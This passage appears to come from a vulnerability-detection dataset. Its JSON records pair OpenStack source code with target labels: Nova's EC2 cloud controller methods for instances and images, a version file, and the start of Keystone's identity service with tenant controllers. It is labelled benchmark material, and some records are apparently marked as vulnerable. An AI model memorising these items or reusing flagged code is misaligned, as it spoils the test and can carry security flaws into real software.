_format_attr_disable_api_termination(instance, result):\n            _unsupported_attribute(instance, result)\n\n        def _format_attr_group_set(instance, result):\n            CloudController._format_group_set(instance, result)\n\n        def _format_attr_instance_initiated_shutdown_behavior(instance,\n                                                               result):\n            vm_state = instance['vm_state']\n            state_to_value = {\n                vm_states.STOPPED: 'stopped',\n                vm_states.DELETED: 'terminated',\n            }\n            value = state_to_value.get(vm_state)\n            if value:\n                result['instanceInitiatedShutdownBehavior'] = value\n\n        def _format_attr_instance_type(instance, result):\n            self._format_instance_type(instance, result)\n\n        def _format_attr_kernel(instance, result):\n            self._format_kernel_id(instance, result, 'kernel')\n\n        def _format_attr_ramdisk(instance, result):\n            self._format_ramdisk_id(instance, result, 'ramdisk')\n\n        def _format_attr_root_device_name(instance, result):\n            self._format_instance_root_device_name(instance, result)\n\n        def _format_attr_source_dest_check(instance, result):\n            _unsupported_attribute(instance, result)\n\n        def _format_attr_user_data(instance, result):\n            result['userData'] = self._format_user_data(instance)\n\n        attribute_formatter = {\n            'blockDeviceMapping': _format_attr_block_device_mapping,\n            'disableApiTermination': _format_attr_disable_api_termination,\n            'groupSet': _format_attr_group_set,\n            'instanceInitiatedShutdownBehavior':\n            _format_attr_instance_initiated_shutdown_behavior,\n            'instanceType': _format_attr_instance_type,\n            'kernel': _format_attr_kernel,\n            'ramdisk': _format_attr_ramdisk,\n            'rootDeviceName': _format_attr_root_device_name,\n            'sourceDestCheck': _format_attr_source_dest_check,\n            'userData': _format_attr_user_data,\n            }\n\n        fn = attribute_formatter.get(attribute)\n        if fn is None:\n            raise exception.ApiError(\n                _('attribute not supported: %s') % attribute)\n\n        ec2_instance_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_instance_id)\n        instance = self.compute_api.get(context, instance_id)\n        result = {'instance_id': ec2_instance_id}\n        fn(instance, result)\n        return result\n\n    def describe_instances(self, context, **kwargs):\n        # Optional DescribeInstances argument\n        instance_id = kwargs.get('instance_id', None)\n        return self._format_describe_instances(context,\n                instance_id=instance_id)\n\n    def describe_instances_v6(self, context, **kwargs):\n        # Optional DescribeInstancesV6 argument\n        instance_id = kwargs.get('instance_id', None)\n        return self._format_describe_instances(context,\n                instance_id=instance_id, use_v6=True)\n\n    def _format_describe_instances(self, context, **kwargs):\n        return {'reservationSet': self._format_instances(context, **kwargs)}\n\n    def _format_run_instances(self, context, reservation_id):\n        i = self._format_instances(context, reservation_id=reservation_id)\n        assert len(i) == 1\n        return i[0]\n\n    def _format_instance_bdm(self, context, instance_id, root_device_name,\n                             result):\n        \"\"\"Format InstanceBlockDeviceMappingResponseItemType\"\"\"\n        root_device_type = 'instance-store'\n        mapping = []\n        for bdm in db.block_device_mapping_get_all_by_instance(context,\n                                                               instance_id):\n            volume_id = bdm['volume_id']\n            if (volume_id is None or bdm['no_device']):\n                continue\n\n            if (bdm['device_name'] == root_device_name and\n                (bdm['snapshot_id'] or bdm['volume_id'])):\n                assert not bdm['virtual_name']\n                root_device_type = 'ebs'\n\n            vol = self.volume_api.get(context, volume_id=volume_id)\n            LOG.debug(_(\"vol = %s\\n\"), vol)\n            # TODO(yamahata): volume attach time\n            ebs = {'volumeId': volume_id,\n                   'deleteOnTermination': bdm['delete_on_termination'],\n                   'attachTime': vol['attach_time'] or '-',\n                   'status': vol['status'], }\n            res = {'deviceName': bdm['device_name'],\n                   'ebs': ebs, }\n            mapping.append(res)\n\n        if mapping:\n            result['blockDeviceMapping'] = mapping\n        result['rootDeviceType'] = root_device_type\n\n    @staticmethod\n    def _format_instance_root_device_name(instance, result):\n        result['rootDeviceName'] = (instance.get('root_device_name') or\n                                    _DEFAULT_ROOT_DEVICE_NAME)\n\n    @staticmethod\n    def _format_instance_type(instance, result):\n        if instance['instance_type']:\n            result['instanceType'] = instance['instance_type'].get('name')\n        else:\n            result['instanceType'] = None\n\n    @staticmethod\n    def _format_group_set(instance, result):\n        security_group_names = []\n        if instance.get('security_groups'):\n            for security_group in instance['security_groups']:\n                security_group_names.append(security_group['name'])\n        result['groupSet'] = utils.convert_to_list_dict(\n            security_group_names, 'groupId')\n\n    def _format_instances(self, context, instance_id=None, use_v6=False,\n            **search_opts):\n        # TODO(termie): this method is poorly named as its name does not imply\n        #               that it will be making a variety of database calls\n        #               rather than simply formatting a bunch of instances that\n        #               were handed to it\n        reservations = {}\n        # NOTE(vish): instance_id is an optional list of ids to filter by\n        if instance_id:\n            instances = []\n            for ec2_id in instance_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                try:\n                    instance = self.compute_api.get(context, internal_id)\n                except exception.NotFound:\n                    continue\n                instances.append(instance)\n        else:\n            try:\n                # always filter out deleted instances\n                search_opts['deleted'] = False\n                instances = self.compute_api.get_all(context,\n                                                     search_opts=search_opts)\n            except exception.NotFound:\n                instances = []\n        for instance in instances:\n            if not context.is_admin:\n                if instance['image_ref'] == str(FLAGS.vpn_image_id):\n                    continue\n            i = {}\n            instance_id = instance['id']\n            ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            i['instanceId'] = ec2_id\n            i['imageId'] = self.image_ec2_id(instance['image_ref'])\n            self._format_kernel_id(instance, i, 'kernelId')\n            self._format_ramdisk_id(instance, i, 'ramdiskId')\n            i['instanceState'] = {\n                'code': instance['power_state'],\n                'name': state_description_from_vm_state(instance['vm_state'])}\n            fixed_addr = None\n            floating_addr = None\n            if instance['fixed_ips']:\n                fixed = instance['fixed_ips'][0]\n                fixed_addr = fixed['address']\n                if fixed['floating_ips']:\n                    floating_addr = fixed['floating_ips'][0]['address']\n                if fixed['network'] and use_v6:\n                    i['dnsNameV6'] = ipv6.to_global(\n                        fixed['network']['cidr_v6'],\n                        fixed['virtual_interface']['address'],\n                        instance['project_id'])\n\n            i['privateDnsName'] = fixed_addr\n            i['privateIpAddress'] = fixed_addr\n            i['publicDnsName'] = floating_addr\n            i['ipAddress'] = floating_addr or fixed_addr\n            i['dnsName'] = i['publicDnsName'] or i['privateDnsName']\n            i['keyName'] = instance['key_name']\n\n            if context.is_admin:\n                i['keyName'] = '%s (%s, %s)' % (i['keyName'],\n                    instance['project_id'],\n                    instance['host'])\n            i['productCodesSet'] = utils.convert_to_list_dict([],\n                                                              'product_codes')\n            self._format_instance_type(instance, i)\n            i['launchTime'] = instance['created_at']\n            i['amiLaunchIndex'] = instance['launch_index']\n            i['displayName'] = instance['display_name']\n            i['displayDescription'] = instance['display_description']\n            self._format_instance_root_device_name(instance, i)\n            self._format_instance_bdm(context, instance_id,\n                                      i['rootDeviceName'], i)\n            host = instance['host']\n            zone = self._get_availability_zone_by_host(context, host)\n            i['placement'] = {'availabilityZone': zone}\n            if instance['reservation_id'] not in reservations:\n                r = {}\n                r['reservationId'] = instance['reservation_id']\n                r['ownerId'] = instance['project_id']\n                self._format_group_set(instance, r)\n                r['instancesSet'] = []\n                reservations[instance['reservation_id']] = r\n            reservations[instance['reservation_id']]['instancesSet'].append(i)\n\n        return list(reservations.values())\n\n    def describe_addresses(self, context, **kwargs):\n        return self.format_addresses(context)\n\n    def format_addresses(self, context):\n        addresses = []\n        if context.is_admin:\n            iterator = db.floating_ip_get_all(context)\n        else:\n            iterator = db.floating_ip_get_all_by_project(context,\n                                                         context.project_id)\n        for floating_ip_ref in iterator:\n            if floating_ip_ref['project_id'] is None:\n                continue\n            address = floating_ip_ref['address']\n            ec2_id = None\n            if (floating_ip_ref['fixed_ip']\n                and floating_ip_ref['fixed_ip']['instance']):\n                instance_id = floating_ip_ref['fixed_ip']['instance']['id']\n                ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            address_rv = {'public_ip': address,\n                          'instance_id': ec2_id}\n            if context.is_admin:\n                details = \"%s (%s)\" % (address_rv['instance_id'],\n                                       floating_ip_ref['project_id'])\n                address_rv['instance_id'] = details\n            addresses.append(address_rv)\n        return {'addressesSet': addresses}\n\n    def allocate_address(self, context, **kwargs):\n        LOG.audit(_(\"Allocate address\"), context=context)\n        try:\n            public_ip = self.network_api.allocate_floating_ip(context)\n            return {'publicIp': public_ip}\n        except rpc.RemoteError as ex:\n            # NOTE(tr3buchet) - why does this block exist?\n            if ex.exc_type == 'NoMoreFloatingIps':\n                raise exception.NoMoreFloatingIps()\n            else:\n                raise\n\n    def release_address(self, context, public_ip, **kwargs):\n        LOG.audit(_(\"Release address %s\"), public_ip, context=context)\n        self.network_api.release_floating_ip(context, address=public_ip)\n        return {'releaseResponse': [\"Address released.\"]}\n\n    def associate_address(self, context, instance_id, public_ip, **kwargs):\n        LOG.audit(_(\"Associate address %(public_ip)s to\"\n                \" instance %(instance_id)s\") % locals(), context=context)\n        instance_id = ec2utils.ec2_id_to_id(instance_id)\n        self.compute_api.associate_floating_ip(context,\n                                               instance_id=instance_id,\n                                               address=public_ip)\n        return {'associateResponse': [\"Address associated.\"]}\n\n    def disassociate_address(self, context, public_ip, **kwargs):\n        LOG.audit(_(\"Disassociate address %s\"), public_ip, context=context)\n        self.network_api.disassociate_floating_ip(context, address=public_ip)\n        return {'disassociateResponse': [\"Address disassociated.\"]}\n\n    def run_instances(self, context, **kwargs):\n        max_count = int(kwargs.get('max_count', 1))\n        if kwargs.get('kernel_id'):\n            kernel = self._get_image(context, kwargs['kernel_id'])\n            kwargs['kernel_id'] = kernel['id']\n        if kwargs.get('ramdisk_id'):\n            ramdisk = self._get_image(context, kwargs['ramdisk_id'])\n            kwargs['ramdisk_id'] = ramdisk['id']\n        for bdm in kwargs.get('block_device_mapping', []):\n            _parse_block_device_mapping(bdm)\n\n        image = self._get_image(context, kwargs['image_id'])\n\n        if image:\n            image_state = self._get_image_state(image)\n        else:\n            raise exception.ImageNotFound(image_id=kwargs['image_id'])\n\n        if image_state != 'available':\n            raise exception.ApiError(_('Image must be available'))\n\n        instances = self.compute_api.create(context,\n            instance_type=instance_types.get_instance_type_by_name(\n                kwargs.get('instance_type', None)),\n            image_href=self._get_image(context, kwargs['image_id'])['id'],\n            min_count=int(kwargs.get('min_count', max_count)),\n            max_count=max_count,\n            kernel_id=kwargs.get('kernel_id'),\n            ramdisk_id=kwargs.get('ramdisk_id'),\n            display_name=kwargs.get('display_name'),\n            display_description=kwargs.get('display_description'),\n            key_name=kwargs.get('key_name'),\n            user_data=kwargs.get('user_data'),\n            security_group=kwargs.get('security_group'),\n            availability_zone=kwargs.get('placement', {}).get(\n                                  'availability_zone'),\n            block_device_mapping=kwargs.get('block_device_mapping', {}))\n        return self._format_run_instances(context,\n                reservation_id=instances[0]['reservation_id'])\n\n    def _do_instance(self, action, context, ec2_id):\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        action(context, instance_id=instance_id)\n\n    def _do_instances(self, action, context, instance_id):\n        for ec2_id in instance_id:\n            self._do_instance(action, context, ec2_id)\n\n    def terminate_instances(self, context, instance_id, **kwargs):\n        \"\"\"Terminate each instance in instance_id, which is a list of ec2 ids.\n        instance_id is a kwarg so its name cannot be modified.\"\"\"\n        LOG.debug(_(\"Going to start terminating instances\"))\n        self._do_instances(self.compute_api.delete, context, instance_id)\n        return True\n\n    def reboot_instances(self, context, instance_id, **kwargs):\n        \"\"\"instance_id is a list of instance ids\"\"\"\n        LOG.audit(_(\"Reboot instance %r\"), instance_id, context=context)\n        self._do_instances(self.compute_api.reboot, context, instance_id)\n        return True\n\n    def stop_instances(self, context, instance_id, **kwargs):\n        \"\"\"Stop each instances in instance_id.\n        Here instance_id is a list of instance ids\"\"\"\n        LOG.debug(_(\"Going to stop instances\"))\n        self._do_instances(self.compute_api.stop, context, instance_id)\n        return True\n\n    def start_instances(self, context, instance_id, **kwargs):\n        \"\"\"Start each instances in instance_id.\n        Here instance_id is a list of instance ids\"\"\"\n        LOG.debug(_(\"Going to start instances\"))\n        self._do_instances(self.compute_api.start, context, instance_id)\n        return True\n\n    def rescue_instance(self, context, instance_id, **kwargs):\n        \"\"\"This is an extension to the normal ec2_api\"\"\"\n        self._do_instance(self.compute_api.rescue, context, instance_id)\n        return True\n\n    def unrescue_instance(self, context, instance_id, **kwargs):\n        \"\"\"This is an extension to the normal ec2_api\"\"\"\n        self._do_instance(self.compute_api.unrescue, context, instance_id)\n        return True\n\n    def update_instance(self, context, instance_id, **kwargs):\n        updatable_fields = ['display_name', 'display_description']\n        changes = {}\n        for field in updatable_fields:\n            if field in kwargs:\n                changes[field] = kwargs[field]\n        if changes:\n            instance_id = ec2utils.ec2_id_to_id(instance_id)\n            self.compute_api.update(context, instance_id=instance_id,\n                                    **changes)\n        return True\n\n    @staticmethod\n    def _image_type(image_type):\n        \"\"\"Converts to a three letter image type.\n\n        aki, kernel => aki\n        ari, ramdisk => ari\n        anything else => ami\n\n        \"\"\"\n        if image_type == 'kernel':\n            return 'aki'\n        if image_type == 'ramdisk':\n            return 'ari'\n        if image_type not in ['aki', 'ari']:\n            return 'ami'\n        return image_type\n\n    @staticmethod\n    def image_ec2_id(image_id, image_type='ami'):\n        \"\"\"Returns image ec2_id using id and three letter type.\"\"\"\n        template = image_type + '-%08x'\n        try:\n            return ec2utils.id_to_ec2_id(int(image_id), template=template)\n        except ValueError:\n            #TODO(wwolf): once we have ec2_id -> glance_id mapping\n            # in place, this wont be necessary\n            return \"ami-00000000\"\n\n    def _get_image(self, context, ec2_id):\n        try:\n            internal_id = ec2utils.ec2_id_to_id(ec2_id)\n            image = self.image_service.show(context, internal_id)\n        except (exception.InvalidEc2Id, exception.ImageNotFound):\n            try:\n                return self.image_service.show_by_name(context, ec2_id)\n            except exception.NotFound:\n                raise exception.ImageNotFound(image_id=ec2_id)\n        image_type = ec2_id.split('-')[0]\n        if self._image_type(image.get('container_format')) != image_type:\n            raise exception.ImageNotFound(image_id=ec2_id)\n        return image\n\n    def _format_image(self, image):\n        \"\"\"Convert from format defined by BaseImageService to S3 format.\"\"\"\n        i = {}\n        image_type = self._image_type(image.get('container_format'))\n        ec2_id = self.image_ec2_id(image.get('id'), image_type)\n        name = image.get('name')\n        i['imageId'] = ec2_id\n        kernel_id = image['properties'].get('kernel_id')\n        if kernel_id:\n            i['kernelId'] = self.image_ec2_id(kernel_id, 'aki')\n        ramdisk_id = image['properties'].get('ramdisk_id')\n        if ramdisk_id:\n            i['ramdiskId'] = self.image_ec2_id(ramdisk_id, 'ari')\n        i['imageOwnerId'] = image['properties'].get('owner_id')\n        if name:\n            i['imageLocation'] = \"%s (%s)\" % (image['properties'].\n                                              get('image_location'), name)\n        else:\n            i['imageLocation'] = image['properties'].get('image_location')\n\n        i['imageState'] = self._get_image_state(image)\n        i['displayName'] = name\n        i['description'] = image.get('description')\n        display_mapping = {'aki': 'kernel',\n                           'ari': 'ramdisk',\n                           'ami': 'machine'}\n        i['imageType'] = display_mapping.get(image_type)\n        i['isPublic'] = image.get('is_public') == True\n        i['architecture'] = image['properties'].get('architecture')\n\n        properties = image['properties']\n        root_device_name = block_device.properties_root_device_name(properties)\n        root_device_type = 'instance-store'\n        for bdm in properties.get('block_device_mapping', []):\n            if (bdm.get('device_name') == root_device_name and\n                ('snapshot_id' in bdm or 'volume_id' in bdm) and\n                not bdm.get('no_device')):\n                root_device_type = 'ebs'\n        i['rootDeviceName'] = (root_device_name or _DEFAULT_ROOT_DEVICE_NAME)\n        i['rootDeviceType'] = root_device_type\n\n        _format_mappings(properties, i)\n\n        return i\n\n    def describe_images(self, context, image_id=None, **kwargs):\n        # NOTE: image_id is a list!\n        if image_id:\n            images = []\n            for ec2_id in image_id:\n                try:\n                    image = self._get_image(context, ec2_id)\n                except exception.NotFound:\n                    raise exception.ImageNotFound(image_id=ec2_id)\n                images.append(image)\n        else:\n            images = self.image_service.detail(context)\n        images = [self._format_image(i) for i in images]\n        return {'imagesSet': images}\n\n    def deregister_image(self, context, image_id, **kwargs):\n        LOG.audit(_(\"De-registering image %s\"), image_id, context=context)\n        image = self._get_image(context, image_id)\n        internal_id = image['id']\n        self.image_service.delete(context, internal_id)\n        return {'imageId': image_id}\n\n    def _register_image(self, context, metadata):\n        image = self.image_service.create(context, metadata)\n        image_type = self._image_type(image.get('container_format'))\n        image_id = self.image_ec2_id(image['id'], image_type)\n        return image_id\n\n    def register_image(self, context, image_location=None, **kwargs):\n        if image_location is None and 'name' in kwargs:\n            image_location = kwargs['name']\n        metadata = {'properties': {'image_location': image_location}}\n\n        if 'root_device_name' in kwargs:\n            metadata['properties']['root_device_name'] = \\\n            kwargs.get('root_device_name')\n\n        mappings = [_parse_block_device_mapping(bdm) for bdm in\n                    kwargs.get('block_device_mapping', [])]\n        if mappings:\n            metadata['properties']['block_device_mapping'] = mappings\n\n        image_id = self._register_image(context, metadata)\n        msg = _(\"Registered image %(image_location)s with\"\n                \" id %(image_id)s\") % locals()\n        LOG.audit(msg, context=context)\n        return {'imageId': image_id}\n\n    def describe_image_attribute(self, context, image_id, attribute, **kwargs):\n        def _block_device_mapping_attribute(image, result):\n            _format_mappings(image['properties'], result)\n\n        def _launch_permission_attribute(image, result):\n            result['launchPermission'] = []\n            if image['is_public']:\n                result['launchPermission'].append({'group': 'all'})\n\n        def _root_device_name_attribute(image, result):\n            result['rootDeviceName'] = \\\n                block_device.properties_root_device_name(image['properties'])\n            if result['rootDeviceName'] is None:\n                result['rootDeviceName'] = _DEFAULT_ROOT_DEVICE_NAME\n\n        supported_attributes = {\n            'blockDeviceMapping': _block_device_mapping_attribute,\n            'launchPermission': _launch_permission_attribute,\n            'rootDeviceName': _root_device_name_attribute,\n            }\n\n        fn = supported_attributes.get(attribute)\n        if fn is None:\n            raise exception.ApiError(_('attribute not supported: %s')\n                                     % attribute)\n        try:\n            image = self._get_image(context, image_id)\n        except exception.NotFound:\n            raise exception.ImageNotFound(image_id=image_id)\n\n        result = {'imageId': image_id}\n        fn(image, result)\n        return result\n\n    def modify_image_attribute(self, context, image_id, attribute,\n                               operation_type, **kwargs):\n        # TODO(devcamcar): Support users and groups other than 'all'.\n        if attribute != 'launchPermission':\n            raise exception.ApiError(_('attribute not supported: %s')\n                                     % attribute)\n        if not 'user_group' in kwargs:\n            raise exception.ApiError(_('user or group not specified'))\n        if len(kwargs['user_group']) != 1 and kwargs['user_group'][0] != 'all':\n            raise exception.ApiError(_('only group \"all\" is supported'))\n        if not operation_type in ['add', 'remove']:\n            raise exception.ApiError(_('operation_type must be add or remove'))\n        LOG.audit(_(\"Updating image %s publicity\"), image_id, context=context)\n\n        try:\n            image = self._get_image(context, image_id)\n        except exception.NotFound:\n            raise exception.ImageNotFound(image_id=image_id)\n        internal_id = image['id']\n        del(image['id'])\n\n        image['is_public'] = (operation_type == 'add')\n        return self.image_service.update(context, internal_id, image)\n\n    def update_image(self, context, image_id, **kwargs):\n        internal_id = ec2utils.ec2_id_to_id(image_id)\n        result = self.image_service.update(context, internal_id, dict(kwargs))\n        return result\n\n    # TODO(yamahata): race condition\n    # At the moment there is no way to prevent others from\n    # manipulating instances/volumes/snapshots.\n    # As other code doesn't take it into consideration, here we don't\n    # care of it for now. Ostrich algorithm\n    def create_image(self, context, instance_id, **kwargs):\n        # NOTE(yamahata): name/description are ignored by register_image(),\n        #                 do so here\n        no_reboot = kwargs.get('no_reboot', False)\n\n        ec2_instance_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_instance_id)\n        instance = self.compute_api.get(context, instance_id)\n\n        # stop the instance if necessary\n        restart_instance = False\n        if not no_reboot:\n            vm_state = instance['vm_state']\n\n            # if the instance is in subtle state, refuse to proceed.\n            if vm_state not in (vm_states.ACTIVE, vm_states.STOPPED):\n                raise exception.InstanceNotRunning(instance_id=ec2_instance_id)\n\n            if vm_state == vm_states.ACTIVE:\n                restart_instance = True\n                self.compute_api.stop(context, instance_id=instance_id)\n\n            # wait instance for really stopped\n            start_time = time.time()\n            while vm_state != vm_states.STOPPED:\n                time.sleep(1)\n                instance = self.compute_api.get(context, instance_id)\n                vm_state = instance['vm_state']\n                # NOTE(yamahata): timeout and error. 1 hour for now for safety.\n                #                 Is it too short/long?\n                #                 Or is there any better way?\n                timeout = 1 * 60 * 60 * 60\n                if time.time() > start_time + timeout:\n                    raise exception.ApiError(\n                        _('Couldn\\'t stop instance with in %d sec') % timeout)\n\n        src_image = self._get_image(context, instance['image_ref'])\n        properties = src_image['properties']\n        if instance['root_device_name']:\n            properties['root_device_name'] = instance['root_device_name']\n\n        mapping = []\n        bdms = db.block_device_mapping_get_all_by_instance(context,\n                                                           instance_id)\n        for bdm in bdms:\n            if bdm.no_device:\n                continue\n            m = {}\n            for attr in ('device_name', 'snapshot_id', 'volume_id',\n                         'volume_size', 'delete_on_termination', 'no_device',\n                         'virtual_name'):\n                val = getattr(bdm, attr)\n                if val is not None:\n                    m[attr] = val\n\n            volume_id = m.get('volume_id')\n            if m.get('snapshot_id') and volume_id:\n                # create snapshot based on volume_id\n                vol = self.volume_api.get(context, volume_id=volume_id)\n                # NOTE(yamahata): Should we wait for snapshot creation?\n                #                 Linux LVM snapshot creation completes in\n                #                 short time, it doesn't matter for now.\n                snapshot = self.volume_api.create_snapshot_force(\n                    context, volume_id=volume_id, name=vol['display_name'],\n                    description=vol['display_description'])\n                m['snapshot_id'] = snapshot['id']\n                del m['volume_id']\n\n            if m:\n                mapping.append(m)\n\n        for m in _properties_get_mappings(properties):\n            virtual_name = m['virtual']\n            if virtual_name in ('ami', 'root'):\n                continue\n\n            assert block_device.is_swap_or_ephemeral(virtual_name)\n            device_name = m['device']\n            if device_name in [b['device_name'] for b in mapping\n                               if not b.get('no_device', False)]:\n                continue\n\n            # NOTE(yamahata): swap and ephemeral devices are specified in\n            #                 AMI, but disabled for this instance by user.\n            #                 So disable those device by no_device.\n            mapping.append({'device_name': device_name, 'no_device': True})\n\n        if mapping:\n            properties['block_device_mapping'] = mapping\n\n        for attr in ('status', 'location', 'id'):\n            src_image.pop(attr, None)\n\n        image_id = self._register_image(context, src_image)\n\n        if restart_instance:\n            self.compute_api.start(context, instance_id=instance_id)\n\n        return {'imageId': image_id}\n", "target": 0}
{"idx": 993, "func": "VERSION = (0, 0, 52)\n\n__version__ = '.'.join(map(str, VERSION))\n", "target": 1}
{"idx": 994, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\n\"\"\"Main entry point into the Identity service.\"\"\"\n\nimport uuid\nimport urllib\nimport urlparse\n\nfrom keystone import config\nfrom keystone import exception\nfrom keystone import policy\nfrom keystone import token\nfrom keystone.common import logging\nfrom keystone.common import manager\nfrom keystone.common import wsgi\n\n\nCONF = config.CONF\n\nLOG = logging.getLogger(__name__)\n\n\nclass Manager(manager.Manager):\n    \"\"\"Default pivot point for the Identity backend.\n\n    See :mod:`keystone.common.manager.Manager` for more details on how this\n    dynamically calls the backend.\n\n    \"\"\"\n\n    def __init__(self):\n        super(Manager, self).__init__(CONF.identity.driver)\n\n\nclass Driver(object):\n    \"\"\"Interface description for an Identity driver.\"\"\"\n\n    def authenticate(self, user_id=None, tenant_id=None, password=None):\n        \"\"\"Authenticate a given user, tenant and password.\n\n        Returns: (user, tenant, metadata).\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_tenant(self, tenant_id):\n        \"\"\"Get a tenant by id.\n\n        Returns: tenant_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_tenant_by_name(self, tenant_name):\n        \"\"\"Get a tenant by name.\n\n        Returns: tenant_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_user(self, user_id):\n        \"\"\"Get a user by id.\n\n        Returns: user_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_user_by_name(self, user_name):\n        \"\"\"Get a user by name.\n\n        Returns: user_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_role(self, role_id):\n        \"\"\"Get a role by id.\n\n        Returns: role_ref or None.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def list_users(self):\n        \"\"\"List all users in the system.\n\n        NOTE(termie): I'd prefer if this listed only the users for a given\n                      tenant.\n\n        Returns: a list of user_refs or an empty list.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def list_roles(self):\n        \"\"\"List all roles in the system.\n\n        Returns: a list of role_refs or an empty list.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    # NOTE(termie): seven calls below should probably be exposed by the api\n    #               more clearly when the api redesign happens\n    def add_user_to_tenant(self, tenant_id, user_id):\n        raise exception.NotImplemented()\n\n    def remove_user_from_tenant(self, tenant_id, user_id):\n        raise exception.NotImplemented()\n\n    def get_all_tenants(self):\n        raise exception.NotImplemented()\n\n    def get_tenants_for_user(self, user_id):\n        \"\"\"Get the tenants associated with a given user.\n\n        Returns: a list of tenant ids.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def get_roles_for_user_and_tenant(self, user_id, tenant_id):\n        \"\"\"Get the roles associated with a user within given tenant.\n\n        Returns: a list of role ids.\n\n        \"\"\"\n        raise exception.NotImplemented()\n\n    def add_role_to_user_and_tenant(self, user_id, tenant_id, role_id):\n        \"\"\"Add a role to a user within given tenant.\"\"\"\n        raise exception.NotImplemented()\n\n    def remove_role_from_user_and_tenant(self, user_id, tenant_id, role_id):\n        \"\"\"Remove a role from a user within given tenant.\"\"\"\n        raise exception.NotImplemented()\n\n    # user crud\n    def create_user(self, user_id, user):\n        raise exception.NotImplemented()\n\n    def update_user(self, user_id, user):\n        raise exception.NotImplemented()\n\n    def delete_user(self, user_id):\n        raise exception.NotImplemented()\n\n    # tenant crud\n    def create_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    def update_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    def delete_tenant(self, tenant_id, tenant):\n        raise exception.NotImplemented()\n\n    # metadata crud\n\n    def get_metadata(self, user_id, tenant_id):\n        raise exception.NotImplemented()\n\n    def create_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    def update_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    def delete_metadata(self, user_id, tenant_id, metadata):\n        raise exception.NotImplemented()\n\n    # role crud\n    def create_role(self, role_id, role):\n        raise exception.NotImplemented()\n\n    def update_role(self, role_id, role):\n        raise exception.NotImplemented()\n\n    def delete_role(self, role_id):\n        raise exception.NotImplemented()\n\n\nclass PublicRouter(wsgi.ComposableRouter):\n    def add_routes(self, mapper):\n        tenant_controller = TenantController()\n        mapper.connect('/tenants',\n                       controller=tenant_controller,\n                       action='get_tenants_for_token',\n                       conditions=dict(methods=['GET']))\n\n\nclass AdminRouter(wsgi.ComposableRouter):\n    def add_routes(self, mapper):\n        # Tenant Operations\n        tenant_controller = TenantController()\n        mapper.connect('/tenants',\n                       controller=tenant_controller,\n                       action='get_all_tenants',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/tenants/{tenant_id}',\n                       controller=tenant_controller,\n                       action='get_tenant',\n                       conditions=dict(method=['GET']))\n\n        # User Operations\n        user_controller = UserController()\n        mapper.connect('/users/{user_id}',\n                       controller=user_controller,\n                       action='get_user',\n                       conditions=dict(method=['GET']))\n\n        # Role Operations\n        roles_controller = RoleController()\n        mapper.connect('/tenants/{tenant_id}/users/{user_id}/roles',\n                       controller=roles_controller,\n                       action='get_user_roles',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/users/{user_id}/roles',\n                       controller=user_controller,\n                       action='get_user_roles',\n                       conditions=dict(method=['GET']))\n\n\nclass TenantController(wsgi.Application):\n    def __init__(self):\n        self.identity_api = Manager()\n        self.policy_api = policy.Manager()\n        self.token_api = token.Manager()\n        super(TenantController, self).__init__()\n\n    def get_all_tenants(self, context, **kw):\n        \"\"\"Gets a list of all tenants for an admin user.\"\"\"\n        self.assert_admin(context)\n        tenant_refs = self.identity_api.get_tenants(context)\n        params = {\n            'limit': context['query_string'].get('limit'),\n            'marker': context['query_string'].get('marker'),\n        }\n        return self._format_tenant_list(tenant_refs, **params)\n\n    def get_tenants_for_token(self, context, **kw):\n        \"\"\"Get valid tenants for token based on token used to authenticate.\n\n        Pulls the token from the context, validates it and gets the valid\n        tenants for the user in the token.\n\n        Doesn't care about token scopedness.\n\n        \"\"\"\n        try:\n            token_ref = self.token_api.get_token(context=context,\n                                                 token_id=context['token_id'])\n        except exception.NotFound:\n            raise exception.Unauthorized()\n\n        user_ref = token_ref['user']\n        tenant_ids = self.identity_api.get_tenants_for_user(\n                context, user_ref['id'])\n        tenant_refs = []\n        for tenant_id in tenant_ids:\n            tenant_refs.append(self.identity_api.get_tenant(\n                    context=context,\n                    tenant_id=tenant_id))\n        params = {\n            'limit': context['query_string'].get('limit'),\n            'marker': context['query_string'].get('marker'),\n        }\n        return self._format_tenant_list(tenant_refs, **params)\n\n    def get_tenant(self, context, tenant_id):\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n        tenant = self.identity_api.get_tenant(context, tenant_id)\n        if tenant is None:\n            raise exception.TenantNotFound(tenant_id=tenant_id)\n\n        return {'tenant': tenant}\n\n    # CRUD Extension\n    def create_tenant(self, context, tenant):\n        tenant_ref = self._normalize_dict(tenant)\n        self.assert_admin(context)\n        tenant_id = (tenant_ref.get('id')\n                     and tenant_ref.get('id')\n                     or uuid.uuid4().hex)\n        tenant_ref['id'] = tenant_id\n\n        tenant = self.identity_api.create_tenant(\n                context, tenant_id, tenant_ref)\n        return 